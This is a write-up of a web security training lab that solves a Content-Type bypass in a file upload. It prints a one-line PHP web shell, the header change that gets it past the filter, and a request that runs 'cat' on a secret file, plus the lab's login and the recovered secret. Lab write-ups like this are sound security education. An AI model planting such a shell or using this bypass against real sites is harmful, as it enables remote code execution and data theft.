## Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- Possibility to leave a comment on a post
- File Upload feature on user account

## Resume

1. Login with wiener:peter
2. Upload **php** shell
3. RCE with **php** shell


## Solve 

The **file upload** feature is on `/my-account`, we have to login with wiener:peter. We can update our **Avatar** via file upload. We will upload our shell.php in order to RCE.

**shell.php**

```php
<?=`$_GET[0]`?>
```

Trying to upload the **shell.php** will triger an error : `Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.`

We can now send the `POST /my-account/avatar` request to repeater and update the **content-type** from `Content-Type: application/x-php` to `Content-Type: image/jpeg` to bypass the restriction.

Once it's uploaded, we can right click over our avatar and open the "image" in new tab. In order to get `/home/carlos/secret` we can use the web shell : 

`/files/avatars/shell.php?0=cat%20/home/carlos/secret` -> "cYw6zrzMjq6b6vnd67pR6Y2j9hqJg9qY"